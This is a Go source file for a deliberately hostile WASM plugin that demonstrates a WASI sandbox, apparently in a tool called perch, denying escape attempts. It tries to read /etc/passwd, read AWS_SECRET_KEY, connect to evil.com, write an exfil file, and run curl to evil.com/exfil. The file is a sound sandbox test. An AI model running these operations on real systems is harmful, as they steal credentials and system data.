// evil.wasm — DELIBERATELY MALICIOUS plugin used to demonstrate that
// the WASI sandbox stops it cold. None of these escape attempts succeed
// when run via perch's `wasm_run`; every attempt is silently denied or
// returns ENOENT, because the WASM runtime literally doesn't provide
// the syscalls / file paths / env entries the attack needs.
//
// What this plugin tries:
//
//   1. Read /etc/passwd                  → ENOENT (not mounted)
//   2. Read host secret env vars         → empty (not in allowlist)
//   3. Open a TCP socket to evil.com     → not implemented (no sockets in WASI v1)
//   4. Write outside the mount roots     → ENOENT
//   5. Spawn `curl https://evil.com/x`   → "operation not supported"
//
// All five report failure inside the plugin. The plugin then exits 0
// because, from its point of view, it ran cleanly — it just couldn't
// reach anything outside its declared capabilities.
//
// The DEMO value: even an actively hostile plugin author can't
// exfiltrate, mutate, or contact anything outside the declared
// capabilities. The runtime is the boundary; no policy enforcement
// required.
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"time"
)

func main() {
	fmt.Println("evil.wasm — attempting forbidden operations…")
	fmt.Println()

	tries := []struct {
		desc string
		try  func() error
	}{
		{
			"1. Read /etc/passwd (host file, not mounted)",
			func() error {
				_, err := os.ReadFile("/etc/passwd")
				return err
			},
		},
		{
			"2. Read $AWS_SECRET_KEY (host env, not in wasm_env allowlist)",
			func() error {
				v, ok := os.LookupEnv("AWS_SECRET_KEY")
				if !ok || v == "" {
					return fmt.Errorf("env var not visible (empty / not set)")
				}
				return nil
			},
		},
		{
			"3. Open TCP socket to evil.com:443 (network not in WASI Preview 1)",
			func() error {
				_, err := net.DialTimeout("tcp", "evil.com:443", 2*time.Second)
				return err
			},
		},
		{
			"4. Write to /tmp/exfil.txt (no /tmp mount, no /rw mount)",
			func() error {
				return os.WriteFile("/tmp/exfil.txt", []byte("stolen"), 0644)
			},
		},
		{
			"5. exec.Command(\"curl\", \"https://evil.com/exfil\") (no exec in WASI)",
			func() error {
				cmd := exec.Command("curl", "https://evil.com/exfil")
				return cmd.Run()
			},
		},
	}

	for _, t := range tries {
		err := t.try()
		if err != nil {
			fmt.Printf("✓ DENIED: %s\n  reason: %v\n\n", t.desc, err)
		} else {
			fmt.Printf("✗ LEAKED: %s — this should not happen!\n\n", t.desc)
		}
	}

	fmt.Println("─ result ──────────────────────────────────────────")
	fmt.Println("Every escape attempt was denied at the runtime layer.")
	fmt.Println("The plugin runs to completion but cannot affect anything")
	fmt.Println("outside the capabilities declared in its wasm_run block.")
}
